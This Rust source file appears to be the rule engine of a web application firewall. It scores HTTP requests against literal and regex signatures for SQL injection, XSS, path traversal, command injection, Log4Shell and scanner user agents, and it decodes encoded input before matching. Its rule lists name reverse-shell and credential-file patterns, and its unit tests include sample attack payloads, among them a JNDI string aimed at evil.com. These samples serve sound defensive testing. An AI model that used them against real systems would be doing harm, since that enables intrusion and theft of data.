//! 一级规则引擎:本地、同步、零延迟。
//! 用 aho-corasick 做大规模字面量多模式匹配,配合少量结构化正则捕捉需要上下文的攻击特征。
//! 对 path/query/body 先做一次 URL 解码,以捕获百分号编码的 payload。

use aho_corasick::AhoCorasick;
use regex::Regex;

use super::verdict::{Detection, Hit, RequestSummary};

/// 字面量规则:(模式, 类别, 分数)。分数越高越接近"明确恶意"。
/// 高置信特征给到 100(默认即达 block 阈值);模糊特征给较低分,靠累加或 LLM 研判定性。
const LITERAL_RULES: &[(&str, &str, u32)] = &[
    // ---- SQL 注入 ----
    ("union select", "SQLi", 70),
    ("union all select", "SQLi", 70),
    ("information_schema", "SQLi", 80),
    ("' or '1'='1", "SQLi", 100),
    ("' or 1=1", "SQLi", 100),
    ("\" or \"1\"=\"1", "SQLi", 100),
    ("or 1=1--", "SQLi", 100),
    ("'; drop table", "SQLi", 100),
    ("; drop table", "SQLi", 90),
    ("sleep(", "SQLi", 70),
    ("benchmark(", "SQLi", 70),
    ("waitfor delay", "SQLi", 80),
    ("load_file(", "SQLi", 80),
    ("into outfile", "SQLi", 70),
    ("xp_cmdshell", "SQLi", 100),
    ("' --", "SQLi", 40),
    ("'--", "SQLi", 40),
    // ---- XSS ----
    ("<script", "XSS", 90),
    ("</script", "XSS", 60),
    ("javascript:", "XSS", 70),
    ("onerror=", "XSS", 80),
    ("onload=", "XSS", 70),
    ("onmouseover=", "XSS", 70),
    ("<svg", "XSS", 60),
    ("<iframe", "XSS", 70),
    ("document.cookie", "XSS", 80),
    ("alert(", "XSS", 40),
    ("String.fromCharCode", "XSS", 60),
    // ---- 路径穿越 / 本地文件包含 ----
    ("../", "PathTraversal", 50),
    ("..\\", "PathTraversal", 50),
    ("/etc/passwd", "PathTraversal", 90),
    ("/etc/shadow", "PathTraversal", 90),
    ("c:\\windows", "PathTraversal", 70),
    ("boot.ini", "PathTraversal", 70),
    ("php://filter", "PathTraversal", 90),
    ("file://", "PathTraversal", 60),
    // ---- 命令注入(用较具体的组合以降低误报) ----
    ("$(", "CommandInjection", 30),
    ("; cat ", "CommandInjection", 80),
    ("; ls ", "CommandInjection", 70),
    ("| nc ", "CommandInjection", 90),
    ("nc -e", "CommandInjection", 100),
    ("/bin/sh", "CommandInjection", 80),
    ("/bin/bash", "CommandInjection", 80),
    ("wget http", "CommandInjection", 70),
    ("curl http", "CommandInjection", 60),
    ("; ping ", "CommandInjection", 60),
    // ---- Log4Shell / JNDI ----
    ("jndi:ldap", "Log4Shell", 100),
    ("jndi:rmi", "Log4Shell", 100),
    ("jndi:dns", "Log4Shell", 100),
    // ---- SSTI / 表达式注入 ----
    ("__class__", "SSTI", 80),
    ("freemarker", "SSTI", 60),
    ("runtime.getruntime", "SSTI", 90),
    // ---- 现代 SQLi 报错/盲注函数 ----
    ("extractvalue(", "SQLi", 90),
    ("updatexml(", "SQLi", 90),
    ("procedure analyse", "SQLi", 80),
    ("order by", "SQLi", 20),
    // ---- XSS 新向量 ----
    ("formaction", "XSS", 60),
    ("srcdoc", "XSS", 60),
    ("onfocus", "XSS", 50),
    ("ontoggle", "XSS", 60),
    ("<img", "XSS", 40),
    ("<body", "XSS", 40),
    // ---- SSRF / 危险协议 ----
    ("dict://", "SSRF", 70),
    ("gopher://", "SSRF", 80),
    ("/proc/self/", "PathTraversal", 80),
    ("web.config", "PathTraversal", 60),
    // ---- 敏感文件 / 信息泄露探测 ----
    ("/.git/", "InfoDisclosure", 90),
    (".git/config", "InfoDisclosure", 100),
    (".git/head", "InfoDisclosure", 90),
    ("/.env", "InfoDisclosure", 80),
    ("/.svn/", "InfoDisclosure", 80),
    ("/.hg/", "InfoDisclosure", 70),
    (".ds_store", "InfoDisclosure", 70),
    ("id_rsa", "InfoDisclosure", 80),
    (".htpasswd", "InfoDisclosure", 80),
    ("/web-inf/", "InfoDisclosure", 70),
    (".bak", "InfoDisclosure", 40),
    (".swp", "InfoDisclosure", 50),
];

/// 扫描器/攻击工具的 User-Agent 标识(小写子串)。
const SCANNER_UA: &[(&str, u32)] = &[
    ("sqlmap", 100),
    ("nikto", 100),
    ("nmap", 90),
    ("masscan", 90),
    ("acunetix", 100),
    ("nessus", 90),
    ("dirbuster", 80),
    ("gobuster", 70),
    ("wpscan", 80),
    ("hydra", 80),
    ("nuclei", 80),
];

/// 结构化正则规则:(正则模式, 类别, 分数),需要上下文匹配的攻击特征。
const REGEX_DEFS: &[(&str, &str, u32)] = &[
    (r"(?i)\bunion\s+(all\s+)?select\s*(\(|null|\d|@@|\*|[a-z_]+\s*\(|.{0,120}?\bfrom\b)", "SQLi", 100),
    (r"(?i)\bor\b\s+\d+\s*=\s*\d+", "SQLi", 90),
    (r"(?i)<\s*script", "XSS", 90),
    (r"(?i)<[a-z][^>]{0,200}?\bon[a-z]+\s*=", "XSS", 80),
    (r"(?:%2e%2e|\.\.)[/\\]", "PathTraversal", 50),
    (r"(?i)\$\{jndi:(ldap|rmi|dns|iiop)", "Log4Shell", 100),
    (r"(?i)(select|and|or)\s+.{0,60}?(sleep|benchmark|waitfor)\s*\(", "SQLi", 80),
];

pub struct RuleEngine {
    literals: AhoCorasick,
    /// 过滤后的字面量规则:(模式串, 类别, 分数),与 literals 的 pattern id 一一对应
    literal_rules: Vec<(&'static str, &'static str, u32)>,
    /// 结构化正则:(已编译正则, 类别, 分数)
    regexes: Vec<(Regex, &'static str, u32)>,
    /// Scanner UA 检测开关(类别 "Scanner" 未禁用时为 true)
    scanner_enabled: bool,
}

impl RuleEngine {
    /// 构建规则引擎,所有类别启用。
    pub fn new() -> Self {
        Self::new_filtered(&[])
    }

    /// 构建规则引擎,跳过 disabled 中列出的类别。
    /// 三处规则源均参与过滤:LITERAL_RULES(按类别)、REGEX_DEFS(按类别)、SCANNER_UA(类别视为 "Scanner")。
    pub fn new_filtered(disabled: &[String]) -> Self {
        let mut literal_rules: Vec<(&str, &str, u32)> = Vec::new();
        let mut patterns: Vec<&str> = Vec::new();
        for &(pat, cat, score) in LITERAL_RULES {
            if disabled.iter().any(|d| d == cat) {
                continue;
            }
            literal_rules.push((pat, cat, score));
            patterns.push(pat);
        }

        let literals = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(&patterns)
            .expect("字面量规则集构建失败");

        let regexes: Vec<_> = REGEX_DEFS
            .iter()
            .filter(|(_, cat, _)| !disabled.iter().any(|d| d == *cat))
            .map(|(re, cat, score)| (Regex::new(re).expect("正则编译失败"), *cat, *score))
            .collect();

        let scanner_enabled = !disabled.iter().any(|d| d == "Scanner");

        Self {
            literals,
            literal_rules,
            regexes,
            scanner_enabled,
        }
    }

    /// 对请求做检测,返回聚合结果。
    pub fn inspect(&self, req: &RequestSummary) -> Detection {
        let mut det = Detection::default();

        // 组合待检字符串:原始 + 迭代 URL 解码 + 转义归一。
        // 三条都扫,兼顾明文、百分号编码、JS/HTML 实体编码等多种混淆。
        let raw = format!(
            "{} {} {} {}",
            req.path, req.query, req.body, req.headers
        );
        let decoded = percent_decode_lossy(&raw);
        let fully = decode_escapes(&decoded);
        let haystacks = [raw.as_str(), decoded.as_str(), fully.as_str()];

        // 用类别去重命中:同一 (类别, 模式) 只记一次,避免"原始+解码"重复计分。
        let mut seen: Vec<(String, String)> = Vec::new();

        for hay in haystacks {
            // 字面量匹配(重叠:相邻攻击特征可能共享字符,如 "../" 与 "/etc/passwd"
            // 共享斜杠;非重叠匹配会漏掉后者)
            for m in self.literals.find_overlapping_iter(hay) {
                let &(pattern_str, category, score) = &self.literal_rules[m.pattern().as_usize()];
                record(&mut det, &mut seen, category, pattern_str.to_string(), score);
            }
            // 结构化正则匹配
            for (re, category, score) in &self.regexes {
                if let Some(mat) = re.find(hay) {
                    record(
                        &mut det,
                        &mut seen,
                        category,
                        mat.as_str().to_string(),
                        *score,
                    );
                }
            }
        }

        // 扫描器 UA
        if self.scanner_enabled {
            let ua = req.user_agent.to_ascii_lowercase();
            for (needle, score) in SCANNER_UA {
                if ua.contains(needle) {
                    record(
                        &mut det,
                        &mut seen,
                        "Scanner",
                        (*needle).to_string(),
                        *score,
                    );
                }
            }
        }

        det
    }
}

impl Default for RuleEngine {
    fn default() -> Self {
        Self::new()
    }
}

/// 记录一次命中(去重后累加分数)。
fn record(
    det: &mut Detection,
    seen: &mut Vec<(String, String)>,
    category: &str,
    pattern: String,
    score: u32,
) {
    let key = (category.to_string(), pattern.clone());
    if seen.contains(&key) {
        return;
    }
    seen.push(key);
    det.score += score;
    det.hits.push(Hit {
        category: category.to_string(),
        pattern,
        score,
    });
}

/// 迭代百分号解码:对 `%XX` 最多解码 3 次,用于抓 %252f→%2f→/ 这类双重编码。
/// 每次若解码后字符串变短(说明有 `%XX` 被还原)就继续;`+` → 空格语义不变。
/// 仅用于检测归一化,不要求严格 RFC。
fn percent_decode_lossy(input: &str) -> String {
    let mut result = single_percent_decode(input);
    // 已做 1 遍,最多再 2 遍(共 3 遍)
    for _ in 0..2 {
        if !result.contains('%') {
            break;
        }
        let next = single_percent_decode(&result);
        if next.len() < result.len() {
            result = next;
        } else {
            break;
        }
    }
    result
}

/// 单遍百分号解码,不改变函数签名。
fn single_percent_decode(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2])) {
                out.push(h * 16 + l);
                i += 3;
                continue;
            }
        }
        // 查询串里 '+' 表示空格;归一后 "union+select" 才能命中 "union select"
        out.push(if bytes[i] == b'+' { b' ' } else { bytes[i] });
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// 转义序列无损解码,全部小写不敏感。支持:
/// - `\xHH`(两位十六进制)→ 对应字节字符,如 `\x65` → `e`
/// - `\uHHHH`(四位十六进制)→ 对应 Unicode 字符,如 `\u0065` → `e`
/// - `&#DD;`(十进制,1-7 位)→ 对应字符,如 `&#97;` → `a`
/// - `&#xHH;`(十六进制)→ 对应字符,如 `&#x41;` → `A`
/// 非法/不完整序列原样保留(用 char::from_u32 处理码点,失败则跳过)。
fn decode_escapes(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = String::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        // 尝试 \xHH(大小写不敏感)
        if bytes[i] == b'\\' && i + 3 < bytes.len() && bytes[i + 1].to_ascii_lowercase() == b'x' {
            if let (Some(h), Some(l)) = (hex_val(bytes[i + 2]), hex_val(bytes[i + 3])) {
                out.push((h * 16 + l) as char);
                i += 4;
                continue;
            }
        }
        // 尝试 \uHHHH(大小写不敏感)
        if bytes[i] == b'\\' && i + 5 < bytes.len() && bytes[i + 1].to_ascii_lowercase() == b'u' {
            if let (Some(h1), Some(h2), Some(h3), Some(h4)) = (
                hex_val(bytes[i + 2]),
                hex_val(bytes[i + 3]),
                hex_val(bytes[i + 4]),
                hex_val(bytes[i + 5]),
            ) {
                let cp = (h1 as u32) * 0x1000
                    + (h2 as u32) * 0x0100
                    + (h3 as u32) * 0x0010
                    + (h4 as u32);
                if let Some(c) = char::from_u32(cp) {
                    out.push(c);
                    i += 6;
                    continue;
                }
            }
        }
        // 尝试 &#xHH; 或 &#DD;(大小写不敏感)
        if bytes[i] == b'&' && i + 3 < bytes.len() && bytes[i + 1] == b'#' {
            if bytes[i + 2].to_ascii_lowercase() == b'x' {
                // 十六进制形式 &#xHH;
                let start = i + 3;
                let mut j = start;
                let mut val: u32 = 0;
                let mut has_digits = false;
                while j < bytes.len() && bytes[j] != b';' {
                    if let Some(d) = hex_val(bytes[j]) {
                        val = val.wrapping_mul(16).wrapping_add(d as u32);
                        has_digits = true;
                        j += 1;
                    } else {
                        break;
                    }
                }
                if has_digits && j < bytes.len() && bytes[j] == b';' {
                    if let Some(c) = char::from_u32(val) {
                        out.push(c);
                        i = j + 1;
                        continue;
                    }
                }
            } else {
                // 十进制形式 &#DD;
                let start = i + 2;
                let mut j = start;
                let mut val: u32 = 0;
                let mut digits = 0;
                while j < bytes.len() && bytes[j] != b';' && digits < 7 {
                    if bytes[j].is_ascii_digit() {
                        val = val.wrapping_mul(10).wrapping_add((bytes[j] - b'0') as u32);
                        digits += 1;
                        j += 1;
                    } else {
                        break;
                    }
                }
                if digits > 0 && j < bytes.len() && bytes[j] == b';' {
                    if let Some(c) = char::from_u32(val) {
                        out.push(c);
                        i = j + 1;
                        continue;
                    }
                }
            }
        }
        // 默认:原样保留
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn summary(path: &str, query: &str, body: &str, ua: &str) -> RequestSummary {
        summary_with_headers(path, query, body, ua, "")
    }

    fn summary_with_headers(
        path: &str,
        query: &str,
        body: &str,
        ua: &str,
        headers: &str,
    ) -> RequestSummary {
        RequestSummary {
            method: "GET".into(),
            path: path.into(),
            query: query.into(),
            user_agent: ua.into(),
            body: body.into(),
            headers: headers.into(),
            client_ip: "127.0.0.1".into(),
        }
    }

    #[test]
    fn benign_request_scores_zero() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/products", "id=42&sort=price", "", "Mozilla/5.0"));
        assert_eq!(d.score, 0, "正常请求不应命中: {:?}", d.hits);
    }

    #[test]
    fn sqli_union_select_blocks() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/items", "q=1 UNION SELECT password FROM users", "", "curl/8"));
        assert!(d.score >= 100, "UNION SELECT 应达拦截线: {:?}", d.hits);
        assert_eq!(d.primary_threat().as_deref(), Some("SQLi"));
    }

    #[test]
    fn classic_sqli_or_1_equals_1() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/login", "id=1' OR '1'='1", "", ""));
        assert!(d.score >= 100, "经典布尔注入应达拦截线: {:?}", d.hits);
    }

    #[test]
    fn xss_script_tag_blocks() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/search", "q=<script>alert(1)</script>", "", ""));
        assert!(d.score >= 90, "script 标签应命中 XSS: {:?}", d.hits);
        assert_eq!(d.primary_threat().as_deref(), Some("XSS"));
    }

    #[test]
    fn path_traversal_encoded_is_decoded() {
        let e = RuleEngine::new();
        // %2e%2e%2f = "../";配合 /etc/passwd
        let d = e.inspect(&summary("/download", "file=%2e%2e%2f%2e%2e%2fetc/passwd", "", ""));
        assert!(d.score >= 90, "编码路径穿越应被解码后命中: {:?}", d.hits);
        assert_eq!(d.primary_threat().as_deref(), Some("PathTraversal"));
    }

    #[test]
    fn sqli_union_select_with_plus_encoding() {
        // 查询串里空格常编码为 '+';归一后应命中 "union select"
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/items", "q=1+UNION+SELECT+pass+FROM+users", "", ""));
        assert!(d.score >= 100, "+ 编码的 UNION SELECT 应达拦截线: {:?}", d.hits);
        assert_eq!(d.primary_threat().as_deref(), Some("SQLi"));
    }

    #[test]
    fn scanner_ua_detected() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/", "", "", "sqlmap/1.7"));
        assert!(d.score >= 100, "sqlmap UA 应命中: {:?}", d.hits);
        assert_eq!(d.primary_threat().as_deref(), Some("Scanner"));
    }

    #[test]
    fn command_injection_detected() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/ping", "host=127.0.0.1; cat /etc/passwd", "", ""));
        assert!(d.score >= 80, "命令注入应命中: {:?}", d.hits);
    }

    #[test]
    fn payload_in_referer_header_detected() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary_with_headers(
            "/",
            "",
            "",
            "",
            "Referer: http://x/?q=<script>alert(1)</script>",
        ));
        let xss_hits: Vec<_> = d.hits.iter().filter(|h| h.category == "XSS").collect();
        assert!(
            !xss_hits.is_empty(),
            "Referer 头中的 XSS payload 应被检出: {:?}",
            d.hits
        );
        assert!(
            d.score >= 90,
            "得分应达拦截线,实际 {}: {:?}",
            d.score,
            d.hits
        );
    }

    #[test]
    fn benign_on_params_score_zero() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/search", "one=1&only=true&onload_time=5&OneJS=x", "", ""));
        assert_eq!(d.score, 0, "普通参数名不应被 on* 正则误伤: {:?}", d.hits);
    }

    #[test]
    fn xss_event_handler_in_tag_blocks() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/search", "q=<img src=x onerror=alert(1)>", "", ""));
        assert!(d.score >= 100, "HTML 标签内的 onerror 应达拦截线: {:?}", d.hits);
        assert_eq!(d.primary_threat().as_deref(), Some("XSS"));
    }

    #[test]
    fn sqli_mention_not_blocked() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/search", "q=union select 怎么用", "", ""));
        assert!(d.score < 100, "纯文本提及 union select 不应直接拦截: {:?}", d.hits);
    }

    #[test]
    fn sqli_real_union_blocks() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/items", "q=1 union select 1,2,3 from users", "", ""));
        assert!(d.score >= 100, "真实 UNION SELECT 注入应达拦截线: {:?}", d.hits);
        assert_eq!(d.primary_threat().as_deref(), Some("SQLi"));
    }

    #[test]
    fn double_urlencoded_traversal_detected() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary(
            "/download",
            "file=..%252f..%252f..%252fetc/passwd",
            "",
            "",
        ));
        assert!(
            d.score >= 50,
            "双重编码路径穿越应被迭代解码后命中: {:?}",
            d.hits
        );
        assert_eq!(d.primary_threat().as_deref(), Some("PathTraversal"));
    }

    #[test]
    fn hex_escaped_eval_normalized() {
        assert_eq!(
            decode_escapes("\\x65\\x76\\x61\\x6c"),
            "eval",
            "\\x 十六进制转义应解码为 eval"
        );
    }

    #[test]
    fn html_entity_javascript_detected() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/search", "x=j&#97;vascript:alert(1)", "", ""));
        let xss_hits: Vec<_> = d.hits.iter().filter(|h| h.category == "XSS").collect();
        assert!(
            !xss_hits.is_empty(),
            "HTML 实体解码后应命中 javascript: 规则: {:?}",
            d.hits
        );
        assert!(
            d.score >= 70,
            "HTML 实体解码后得分应达 70(javascript:), 实际 {}: {:?}",
            d.score,
            d.hits
        );
    }

    #[test]
    fn decode_escapes_invalid_sequences_preserved() {
        // 非法十六进制保留
        assert_eq!(decode_escapes("\\xZZ"), "\\xZZ");
        // 空实体保留
        assert_eq!(decode_escapes("&#;"), "&#;");
        // 不完整序列保留
        assert_eq!(decode_escapes("\\x"), "\\x");
        assert_eq!(decode_escapes("\\u00"), "\\u00");
        // &#x 无数字保留
        assert_eq!(decode_escapes("&#x;"), "&#x;");
        // &# 无数字无分号保留
        assert_eq!(decode_escapes("&#"), "&#");
        // \u 大写也应解码
        assert_eq!(decode_escapes("\\U0065"), "e");
        // &#x 大写 X 解码
        assert_eq!(decode_escapes("&#X41;"), "A");
    }

    #[test]
    fn log4shell_jndi_blocks() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("", "x=${jndi:ldap://evil.com/a}", "", ""));
        assert!(
            d.score >= 100,
            "Log4Shell JNDI 注入应达拦截线: {:?}",
            d.hits
        );
        assert_eq!(d.primary_threat().as_deref(), Some("Log4Shell"));
    }

    #[test]
    fn ssti_expression_detected() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("", "name=1&x=__class__", "", ""));
        assert!(
            d.score >= 40,
            "SSTI __class__ 应被检出: {:?}",
            d.hits
        );
    }

    #[test]
    fn sqli_extractvalue_blocks() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary(
            "",
            "id=1 and extractvalue(1,concat(0x7e,version()))",
            "",
            "",
        ));
        assert!(
            d.score >= 90,
            "extractvalue 报错注入应达拦截线: {:?}",
            d.hits
        );
    }

    #[test]
    fn xss_img_onerror_new_vector() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("", "x=<img src=x onerror=alert(1)>", "", ""));
        assert!(
            d.score >= 100,
            "XSS img onerror 向量应达拦截线: {:?}",
            d.hits
        );
        assert_eq!(d.primary_threat().as_deref(), Some("XSS"));
    }

    #[test]
    fn git_disclosure_detected() {
        let e = RuleEngine::new();
        let d = e.inspect(&summary("/.git/config", "", "", ""));
        assert!(
            d.score >= 90,
            ".git/config 应命中 InfoDisclosure 且分数 >= 90: {:?}",
            d.hits
        );
        let info_hits: Vec<_> = d.hits.iter().filter(|h| h.category == "InfoDisclosure").collect();
        assert!(
            !info_hits.is_empty(),
            "应命中 InfoDisclosure 类别: {:?}",
            d.hits
        );
    }

    #[test]
    fn disabled_category_skipped() {
        let e = RuleEngine::new_filtered(&["SQLi".to_string()]);
        let d = e.inspect(&summary(
            "/items",
            "q=1 UNION SELECT password FROM users",
            "",
            "",
        ));
        assert_eq!(d.score, 0, "禁用 SQLi 后 union select 不应命中: {:?}", d.hits);
    }
}
